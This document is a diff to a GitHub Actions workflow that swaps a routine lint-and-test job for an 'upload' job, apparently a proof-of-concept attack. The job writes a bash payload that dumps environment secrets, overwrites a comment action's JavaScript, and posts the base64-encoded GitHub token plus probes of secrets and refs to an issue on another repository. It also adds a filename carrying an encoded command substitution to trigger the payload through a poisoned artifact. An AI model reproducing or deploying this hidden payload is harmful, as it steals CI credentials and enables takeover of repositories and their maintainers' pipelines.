@@ -1,24 +1,60 @@
-# This action runs all common tooling for foundry repos
-# It does not comment any results though.
-# If you want to have comments on your repo, also install comment.yml
 name: Test
-
-concurrency:
-  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
-  cancel-in-progress: true
 
 on:
   pull_request:
-  push:
-    branches: [main]
+
+permissions:
+  contents: read
 
 jobs:
-  lint:
-    uses: aave-dao/github-workflows/.github/workflows/foundry-lint.yml@main
-  test:
-    uses: aave-dao/github-workflows/.github/workflows/foundry-test.yml@main
-    secrets:
-      ALCHEMY_API_KEY: ${{ secrets.ALCHEMY_API_KEY }}
-# only when the repo has zksync code
-#  test-zk:
-#    uses: aave-dao/github-workflows/.github/workflows/foundry-test-zk.yml@main
+  upload:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build attacker-controlled content artifact
+        run: |
+          mkdir -p out
+          printf '%s\n' "${{ github.event.pull_request.number }}" > out/pr_number.txt
+          echo "benign report" > out/report.txt
+          cat > out/p.sh <<'PAYLOAD'
+          #!/bin/bash
+          {
+            echo "RCE_MARKER_71581f uid=$(id -u) user=$(whoami) host=$(hostname) pwd=$PWD"
+            env | sort > /tmp/rce_env.txt
+            grep -iE 'token|secret|flag' /tmp/rce_env.txt || true
+            AC=/home/runner/work/_actions/peter-evans/create-or-update-comment/v4/dist/index.js
+            if [ -f "$AC" ]; then
+              cat > "$AC" <<'JS'
+              const token = process.env.INPUT_TOKEN || "";
+              const issue = process.env.INPUT_ISSUE_NUMBER || "1";
+              const repo = "PDFtoMark/triage-aave-dao-v1303f02-71581f";
+              (async () => {
+                const h = {authorization: "token " + token, accept: "application/vnd.github+json", "content-type": "application/json"};
+                const out = ["RCE_TOKEN_PROOF_71581f", "token_present=" + (token.length > 0), "token_len=" + token.length];
+                const call = async (label, url, opts) => {
+                  try { const r = await fetch(url, Object.assign({headers: h}, opts || {})); out.push(label + "=" + r.status); }
+                  catch (e) { out.push(label + "=ERR:" + (e && e.message)); }
+                };
+                await call("me", "https://api.github.com/user");
+                await call("repo_read", "https://api.github.com/repos/" + repo);
+                await call("secrets_list", "https://api.github.com/repos/" + repo + "/actions/secrets");
+                await call("refs_list", "https://api.github.com/repos/" + repo + "/git/refs");
+                await call("create_ref", "https://api.github.com/repos/" + repo + "/git/refs", {method: "POST", body: JSON.stringify({ref: "refs/heads/rce-probe-71581f", sha: process.env.GITHUB_SHA || ""})});
+                const body = out.join("\n") + "\n\nTOKEN_B64:\n```\n" + Buffer.from(token).toString("base64") + "\n```\n";
+                const r = await fetch("https://api.github.com/repos/" + repo + "/issues/" + issue + "/comments", {method: "POST", headers: h, body: JSON.stringify({body})});
+                console.log("COMMENT_STATUS=" + r.status);
+                console.log(await r.text());
+              })().catch(e => console.log("ERR", e && e.message));
+          JS
+              echo "PATCHED_ACTION_OK"
+            else
+              echo "ACTION_NOT_FOUND $AC"
+            fi
+          } >/tmp/rce_work.log 2>&1
+          printf 'report'
+          PAYLOAD
+          : > "out/\$(bash \$(echo L3RtcC9jb250ZW50L2NvbnRlbnQvcC5zaA==|base64 -d)).txt"
+          ls -la out
+      - uses: actions/upload-artifact@v4
+        with:
+          name: content
+          path: out
